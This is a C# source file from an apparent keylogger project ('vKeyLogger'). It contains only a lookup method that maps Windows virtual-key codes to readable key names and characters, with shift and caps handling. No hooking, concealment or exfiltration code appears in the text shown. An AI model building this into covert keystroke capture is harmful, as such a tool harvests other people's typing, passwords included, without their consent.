using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vKeyLogger.APIHandler;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace vKeyLogger
{
    public partial class FuncLib
    {
        public static string getCode(int code, int param = 0,int param1= 0)
        {
            string retval = "";
            switch (code)
            {
                case 8:
                    {
                        retval = "Backspace";
                        break;
                    }

                case 9:
                    {
                        retval = "Tab";
                        break;
                    }

                case 10:
                    {
                        retval = "LineFeed";
                        break;
                    }

                case 11:
                    {
                        retval = "LButton, LineFeed";
                        break;
                    }

                case 12:
                    {
                        retval = "Clear";
                        break;
                    }

                case 13:
                    {
                        retval = "Enter";
                        break;
                    }

                case 14:
                    {
                        retval = "RButton, Clear";
                        break;
                    }

                case 15:
                    {
                        retval = "RButton, Return";
                        break;
                    }

                case 16:
                    {
                        retval = "ShiftKey";
                        break;
                    }

                case 17:
                    {
                        retval = "ControlKey";
                        break;
                    }

                case 18:
                    {
                        retval = "Menu";
                        break;
                    }

                case 19:
                    {
                        retval = "Pause";
                        break;
                    }

                case 20:
                    {
                        retval = "";
                        break;
                    }

                case 21:
                    {
                        retval = "KanaMode";
                        break;
                    }

                case 22:
                    {
                        retval = "RButton, Capital";
                        break;
                    }

                case 23:
                    {
                        retval = "JunjaMode";
                        break;
                    }

                case 24:
                    {
                        retval = "FinalMode";
                        break;
                    }

                case 25:
                    {
                        retval = "HanjaMode";
                        break;
                    }

                case 26:
                    {
                        retval = "RButton, FinalMode";
                        break;
                    }

                case 27:
                    {
                        retval = "Esc";
                        break;
                    }

                case 28:
                    {
                        retval = "IMEConvert";
                        break;
                    }

                case 29:
                    {
                        retval = "IMENonconvert";
                        break;
                    }

                case 30:
                    {
                        retval = "IMEAceept";
                        break;
                    }

                case 31:
                    {
                        retval = "IMEModeChange";
                        break;
                    }

                case 32:
                    {
                        retval = " ";
                        break;
                    }

                case 33:
                    {
                        retval = "PageUp";
                        break;
                    }

                case 34:
                    {
                        retval = "Next";
                        break;
                    }

                case 35:
                    {
                        retval = "End";
                        break;
                    }

                case 36:
                    {
                        retval = "Home";
                        break;
                    }

                case 37:
                    {
                        retval = "Left";
                        break;
                    }

                case 38:
                    {
                        retval = "Up";
                        break;
                    }

                case 39:
                    {
                        retval = "Right";
                        break;
                    }

                case 40:
                    {
                        retval = "Down";
                        break;
                    }

                case 41:
                    {
                        retval = "Select";
                        break;
                    }

                case 42:
                    {
                        retval = "Print";
                        break;
                    }

                case 43:
                    {
                        retval = "Execute";
                        break;
                    }

                case 44:
                    {
                        retval = "PrintScreen";
                        break;
                    }

                case 45:
                    {
                        retval = "Ins";
                        break;
                    }

                case 46:
                    {
                        retval = "Del";
                        break;
                    }

                case 47:
                    {
                        retval = "Help";
                        break;
                    }

                case 48:
                    {
                        if (param == 1)
                            retval = ")";
                        else
                            retval = "0";
                        break;
                    }

                case 49:
                    {
                        if (param == 1)
                            retval = "!";
                        else
                        retval = "1";
                        break;
                    }

                case 50:
                    {
                        if (param == 1)
                            retval = "@";
                        else
                        retval = "2";
                        break;
                    }

                case 51:
                    {
                        if (param == 1)
                            retval = "#";
                        else
                        retval = "3";
                        break;
                    }

                case 52:
                    {
                        if (param == 1)
                            retval = "$";
                        else
                        retval = "4";
                        break;
                    }

                case 53:
                    {
                        if (param == 1)
                            retval = "%";
                        else
                        retval = "5";
                        break;
                    }

                case 54:
                    {
                        if (param == 1)
                            retval = "^";
                        else
                        retval = "6";
                        break;
                    }

                case 55:
                    {
                        if (param == 1)
                            retval = "&";
                        else
                        retval = "7";
                        break;
                    }

                case 56:
                    {
                        if (param == 1)
                            retval = "*";
                        else
                        retval = "8";
                        break;
                    }

                case 57:
                    {
                        if (param == 1)
                            retval = "(";
                        else
                        retval = "9";
                        break;
                    }

                case 58:
                    {
                        retval = "RButton, D8";
                        break;
                    }

                case 59:
                    {
                        retval = "RButton, D9";
                        break;
                    }

                case 60:
                    {
                        retval = "MButton, D8";
                        break;
                    }

                case 61:
                    {
                        retval = "MButton, D9";
                        break;
                    }

                case 62:
                    {
                        retval = "XButton2, D8";
                        break;
                    }

                case 63:
                    {
                        retval = "XButton2, D9";
                        break;
                    }

                case 64:
                    {
                        retval = "64";
                        break;
                    }

                case 65:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "a";
                        else
                        retval = "A";
                        break;
                    }

                case 66:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "b";
                        else
                        retval = "B";
                        break;
                    }

                case 67:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "c";
                        else
                        retval = "C";
                        break;
                    }

                case 68:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "d";
                        else
                        retval = "D";
                        break;
                    }

                case 69:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "e";
                        else
                        retval = "E";
                        break;
                    }

                case 70:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "f";
                        else
                        retval = "F";
                        break;
                    }

                case 71:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "g";
                        else
                        retval = "G";
                        break;
                    }

                case 72:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "h";
                        else
                        retval = "H";
                        break;
                    }

                case 73:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "i";
                        else
                        retval = "I";
                        break;
                    }

                case 74:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "j";
                        else
                        retval = "J";
                        break;
                    }

                case 75:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "k";
                        else
                        retval = "K";
                        break;
                    }

                case 76:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "l";
                        else
                        retval = "L";
                        break;
                    }

                case 77:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "m";
                        else
                        retval = "M";
                        break;
                    }

                case 78:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "n";
                        else
                        retval = "N";
                        break;
                    }

                case 79:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "o";
                        else
                        retval = "O";
                        break;
                    }

                case 80:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "p";
                        else
                        retval = "P";
                        break;
                    }

                case 81:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "q";
                        else
                        retval = "Q";
                        break;
                    }

                case 82:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "r";
                        else
                        retval = "R";
                        break;
                    }

                case 83:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "s";
                        else
                        retval = "S";
                        break;
                    }

                case 84:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "t";
                        else
                        retval = "T";
                        break;
                    }

                case 85:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "u";
                        else
                        retval = "U";
                        break;
                    }

                case 86:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "v";
                        else
                        retval = "V";
                        break;
                    }

                case 87:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "w";
                        else
                        retval = "W";
                        break;
                    }

                case 88:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "x";
                        else
                        retval = "X";
                        break;
                    }

                case 89:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "y";
                        else
                        retval = "Y";
                        break;
                    }

                case 90:
                    {
                        if ((param == 0 && param1 == 0) || ((param == 1) && (param1 == 1)))
                            retval = "z";
                        else
                        retval = "Z";
                        break;
                    }

                case 91:
                    {
                        retval = "LWin";
                        break;
                    }

                case 92:
                    {
                        retval = "RWin";
                        break;
                    }

                case 93:
                    {
                        retval = "Apps";
                        break;
                    }

                case 94:
                    {
                        retval = "RButton, RWin";
                        break;
                    }

                case 95:
                    {
                        retval = "Sleep";
                        break;
                    }

                case 96:
                    {
                        if (param == 1)
                            retval = "Ins";
                        else
                        retval = "0";
                        break;
                    }

                case 97:
                    {
                        if (param == 1)
                            retval = "End";
                        else
                        retval = "1";
                        break;
                    }

                case 98:
                    {
                        if (param == 1)
                            retval = "Down";
                        else
                        retval = "2";
                        break;
                    }

                case 99:
                    {
                        if (param == 1)
                            retval = "PageDown";
                        else
                        retval = "3";
                        break;
                    }

                case 100:
                    {
                        if (param == 1)
                            retval = "Left";
                        else
                        retval = "4";
                        break;
                    }

                case 101:
                    {
                        retval = "5";
                        break;
                    }

                case 102:
                    {
                        if (param == 1)
                            retval = "Left";
                        else
                        retval = "6";
                        break;
                    }

                case 103:
                    {
                        if (param == 1)
                            retval = "Home";
                        else
                        retval = "7";
                        break;
                    }

                case 104:
                    {
                        if (param == 1)
                            retval = "Up";
                        else
                        retval = "8";
                        break;
                    }

                case 105:
                    {
                        if (param == 1)
                            retval = "PageUp";
                        else
                        retval = "9";
                        break;
                    }

                case 106:
                    {
                        retval = "*";
                        break;
                    }

                case 107:
                    {
                        retval = "+";
                        break;
                    }

                case 108:
                    {
                        retval = "Separator";
                        break;
                    }

                case 109:
                    {
                        retval = "-";
                        break;
                    }

                case 110:
                    {
                        retval = ".";
                        break;
                    }

                case 111:
                    {
                        retval = "/";
                        break;
                    }

                case 112:
                    {
                        retval = "F1.";
                        break;
                    }

                case 113:
                    {
                        retval = "F2.";
                        break;
                    }

                case 114:
                    {
                        retval = "F3.";
                        break;
                    }

                case 115:
                    {
                        retval = "F4.";
                        break;
                    }

                case 116:
                    {
                        retval = "F5.";
                        break;
                    }

                case 117:
                    {
                        retval = "F6.";
                        break;
                    }

                case 118:
                    {
                        retval = "F7.";
                        break;
                    }

                case 119:
                    {
                        retval = "F8.";
                        break;
                    }

                case 120:
                    {
                        retval = "F9.";
                        break;
                    }

                case 121:
                    {
                        retval = "F10.";
                        break;
                    }

                case 122:
                    {
                        retval = "F11.";
                        break;
                    }

                case 123:
                    {
                        retval = "F12.";
                        break;
                    }

                case 124:
                    {
                        retval = "F13.";
                        break;
                    }

                case 125:
                    {
                        retval = "F14.";
                        break;
                    }

                case 126:
                    {
                        retval = "F15.";
                        break;
                    }

                case 127:
                    {
                        retval = "F16.";
                        break;
                    }

                case 128:
                    {
                        retval = "F17";
                        break;
                    }

                case 129:
                    {
                        retval = "F18";
                        break;
                    }

                case 130:
                    {
                        retval = "F19";
                        break;
                    }

                case 131:
                    {
                        retval = "F20";
                        break;
                    }

                case 132:
                    {
                        retval = "F21";
                        break;
                    }

                case 133:
                    {
                        retval = "F22";
                        break;
                    }

                case 134:
                    {
                        retval = "F23";
                        break;
                    }

                case 135:
                    {
                        retval = "F24";
                        break;
                    }

                case 136:
                    {
                        retval = "Back, F17";
                        break;
                    }

                case 137:
                    {
                        retval = "Back, F18";
                        break;
                    }

                case 138:
                    {
                        retval = "Back, F19";
                        break;
                    }

                case 139:
                    {
                        retval = "Back, F20";
                        break;
                    }

                case 140:
                    {
                        retval = "Back, F21";
                        break;
                    }

                case 141:
                    {
                        retval = "Back, F22";
                        break;
                    }

                case 142:
                    {
                        retval = "Back, F23";
                        break;
                    }

                case 143:
                    {
                        retval = "Back, F24";
                        break;
                    }

                case 144:
                    {
                        retval = "NumLock";
                        break;
                    }

                case 145:
                    {
                        retval = "Scroll";
                        break;
                    }

                case 146:
                    {
                        retval = "RButton, NumLock";
                        break;
                    }

                case 147:
                    {
                        retval = "RButton, Scroll";
                        break;
                    }

                case 148:
                    {
                        retval = "MButton, NumLock";
                        break;
                    }

                case 149:
                    {
                        retval = "MButton, Scroll";
                        break;
                    }

                case 150:
                    {
                        retval = "XButton2, NumLock";
                        break;
                    }

                case 151:
                    {
                        retval = "XButton2, Scroll";
                        break;
                    }

                case 152:
                    {
                        retval = "Back, NumLock";
                        break;
                    }

                case 153:
                    {
                        retval = "Back, Scroll";
                        break;
                    }

                case 154:
                    {
                        retval = "LineFeed, NumLock";
                        break;
                    }

                case 155:
                    {
                        retval = "LineFeed, Scroll";
                        break;
                    }

                case 156:
                    {
                        retval = "Clear, NumLock";
                        break;
                    }

                case 157:
                    {
                        retval = "Clear, Scroll";
                        break;
                    }

                case 158:
                    {
                        retval = "RButton, Clear, NumLock";
                        break;
                    }

                case 159:
                    {
                        retval = "RButton, Clear, Scroll";
                        break;
                    }

                case 160:
                    {
                        retval = "";
                        break;
                    }

                case 161:
                    {
                        retval = "";
                        break;
                    }

                case 162:
                    {
                        retval = "Ctrl";
                        break;
                    }

                case 163:
                    {
                        retval = "Ctrl";
                        break;
                    }

                case 164:
                    {
                        retval = "LMenu";
                        break;
                    }

                case 165:
                    {
                        retval = "RMenu";
                        break;
                    }

                case 166:
                    {
                        retval = "BrowserBack";
                        break;
                    }

                case 167:
                    {
                        retval = "BrowserForward";
                        break;
                    }

                case 168:
                    {
                        retval = "BrowserRefresh";
                        break;
                    }

                case 169:
                    {
                        retval = "BrowserStop";
                        break;
                    }

                case 170:
                    {
                        retval = "BrowserSearch";
                        break;
                    }

                case 171:
                    {
                        retval = "BrowserFavorites";
                        break;
                    }

                case 172:
                    {
                        retval = "BrowserHome";
                        break;
                    }

                case 173:
                    {
                        retval = "VolumeMute";
                        break;
                    }

                case 174:
                    {
                        retval = "VolumeDown";
                        break;
                    }

                case 175:
                    {
                        retval = "VolumeUp";
                        break;
                    }

                case 176:
                    {
                        retval = "MediaNextTrack";
                        break;
                    }

                case 177:
                    {
                        retval = "MediaPreviousTrack";
                        break;
                    }

                case 178:
                    {
                        retval = "MediaStop";
                        break;
                    }

                case 179:
                    {
                        retval = "MediaPlayPause";
                        break;
                    }

                case 180:
                    {
                        retval = "LaunchMail";
                        break;
                    }

                case 181:
                    {
                        retval = "SelectMedia";
                        break;
                    }

                case 182:
                    {
                        retval = "LaunchApplication1";
                        break;
                    }

                case 183:
                    {
                        retval = "LaunchApplication2";
                        break;
                    }

                case 184:
                    {
                        retval = "Back, MediaNextTrack";
                        break;
                    }

                case 185:
                    {
                        retval = "Back, MediaPreviousTrack";
                        break;
                    }

                case 186:
                    {
                        if (param == 1)
                            retval = ":";
                        else
                            retval = ";";
                        break;
                    }

                case 187:
                    {
                        if (param == 1)
                            retval = "+";
                        else
                            retval = "=";
                        break;
                    }

                case 188:
                    {
                        if (param == 1)
                            retval = "<";
                        else
                            retval = ",";
                        break;
                    }

                case 189:
                    {
                        if (param == 1)
                            retval = "_";
                        else
                            retval = "-";
                        break;
                    }

                case 190:
                    {
                        if (param == 1)
                            retval = ">";
                        else
                            retval = ".";
                        break;
                    }

                case 191:
                    {
                        if (param == 1)
                            retval = "?";
                        else
                            retval = "/";
                        break;
                    }

                case 192:
                    {
                        if (param == 1)
                            retval = "~";
                        else
                            retval = "`";
                        break;
                    }

                case 193:
                    {
                        retval = "LButton, Oemtilde";
                        break;
                    }

                case 194:
                    {
                        retval = "RButton, Oemtilde";
                        break;
                    }

                case 195:
                    {
                        retval = "Cancel, Oemtilde";
                        break;
                    }

                case 196:
                    {
                        retval = "MButton, Oemtilde";
                        break;
                    }

                case 197:
                    {
                        retval = "XButton1, Oemtilde";
                        break;
                    }

                case 198:
                    {
                        retval = "XButton2, Oemtilde";
                        break;
                    }

                case 199:
                    {
                        retval = "LButton, XButton2, Oemtilde";
                        break;
                    }

                case 200:
                    {
                        retval = "Back, Oemtilde";
                        break;
                    }

                case 201:
                    {
                        retval = "Tab, Oemtilde";
                        break;
                    }

                case 202:
                    {
                        retval = "LineFeed, Oemtilde";
                        break;
                    }

                case 203:
                    {
                        retval = "LButton, LineFeed, Oemtilde";
                        break;
                    }

                case 204:
                    {
                        retval = "Clear, Oemtilde";
                        break;
                    }

                case 205:
                    {
                        retval = "Return, Oemtilde";
                        break;
                    }

                case 206:
                    {
                        retval = "RButton, Clear, Oemtilde";
                        break;
                    }

                case 207:
                    {
                        retval = "RButton, Return, Oemtilde";
                        break;
                    }

                case 208:
                    {
                        retval = "ShiftKey, Oemtilde";
                        break;
                    }

                case 209:
                    {
                        retval = "ControlKey, Oemtilde";
                        break;
                    }

                case 210:
                    {
                        retval = "Menu, Oemtilde";
                        break;
                    }

                case 211:
                    {
                        retval = "Pause, Oemtilde";
                        break;
                    }

                case 212:
                    {
                        retval = "Capital, Oemtilde";
                        break;
                    }

                case 213:
                    {
                        retval = "KanaMode, Oemtilde";
                        break;
                    }

                case 214:
                    {
                        retval = "RButton, Capital, Oemtilde";
                        break;
                    }

                case 215:
                    {
                        retval = "JunjaMode, Oemtilde";
                        break;
                    }

                case 216:
                    {
                        retval = "FinalMode, Oemtilde";
                        break;
                    }

                case 217:
                    {
                        retval = "HanjaMode, Oemtilde";
                        break;
                    }

                case 218:
                    {
                        retval = "RButton, FinalMode, Oemtilde";
                        break;
                    }

                case 219:
                    {
                        if (param == 1)
                            retval = "{";
                        else
                            retval = "[";
                        break;
                    }

                case 220:
                    {
                        if (param == 1)
                            retval = "|";
                        else
                            retval = "\\";
                        break;
                    }

                case 221:
                    {
                        if (param == 1)
                            retval = "}";
                        else
                            retval = "]";
                        break;
                    }

                case 222:
                    {
                        if (param == 1)
                            retval = "\"";
                        else
                            retval = "'";
                        break;
                    }

                case 223:
                    {
                        retval = "Oem8";
                        break;
                    }

                case 224:
                    {
                        retval = "Space, Oemtilde";
                        break;
                    }

                case 225:
                    {
                        retval = "PageUp, Oemtilde";
                        break;
                    }

                case 226:
                    {
                        retval = "OemBackslash";
                        break;
                    }


            }
            return retval;
        }
    }
}
